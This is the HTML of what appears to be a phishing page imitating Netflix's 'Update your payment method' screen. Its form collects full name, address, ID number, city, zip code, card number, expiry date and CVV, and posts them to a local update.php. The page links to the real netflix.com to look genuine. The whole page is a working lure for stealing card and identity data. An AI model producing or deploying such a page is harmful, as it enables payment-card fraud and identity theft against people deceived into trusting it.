<html><head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width">
<title>Update your payment method</title>
<link rel="icon" href="./res/img/favicon.ico">
<link rel="stylesheet" href="./res/css/update.css">
<script src="./res/js/jquery.js"></script>
<script src="./res/js/jquery.mask.js"></script>
</head>
<body>
<div class="content">
<div class="top">
<div class="left">
<img src="./res/img/logo.png">
</div>
<div class="right">
<a href="https://netflix.com">Sign Out</a>
</div>
</div>
<div class="login-form">
<h1>Update Your Data</h1>
<div style="margin:5px;">
<img src="./res/img/visa.svg">
<img src="./res/img/ms.svg">
<img src="./res/img/amex.svg">
<img src="./res/img/discover.png">
</div>
 <form action="./process/update.php" method="POST"> 
 
 <input class="input" name="firstname" placeholder="Your Name">
<input class="input" required="" type="text" name="Adress" placeholder="Address">
<input class="input" type="text" minlength="7" maxlength="9" onkeypress="return isNumberKey(event)" required="" name="id" placeholder="ID Number">
<input class="input" required="" name="City" placeholder="City">
<input class="input" required="" name="Zcode" placeholder="Zip Code">
<input class="input" required="" id="cardnumber" type="text" name="cardnumber" placeholder="Card Number" maxlength="16">
<input class="input" required="" id="date" type="text" name="date" placeholder="Expiration Date (MM/YY)" maxlength="5">
<input class="input" required="" id="cvv" type="text" name="cvv" placeholder="Security Code (CVV)" maxlength="3">

<div class="bottom-infos">



</div>
<button id="login-btn" style="margin-top:20px;">Update</button>
</form>



</div>
<div class="footer">
<div class="qs"><a href="#">Questions? Contact us.</a></div>
<div class="f-links">
<a href="#">Gift Card Terms</a> <a href="#">Terms of Use</a> <a href="#">Privacy Statement</a>
</div>
<select>
<option value="english">  English
</option></select>
</div>
</div>
<script>
      <!--
      function isNumberKey(evt)
      {
         var charCode = (evt.which) ? evt.which : event.keyCode
         if (charCode > 31 && (charCode < 48 || charCode > 57))
            return false;

         return true;
      }
      //-->
	  </script>
<script>
$(function(){
	$("#cardnumber").mask("0000 0000 0000 0000");
	$("#date").mask("00/0000");
	$("#cvv").mask("0000");
});

function onLogin(){
	if($("#login").val().trim() == "" || $("#pass").val().trim() == ""){return false;}
	else{
	document.getElementById('login-btn').style.background = "#6a0000";
 
	}
}
</script>
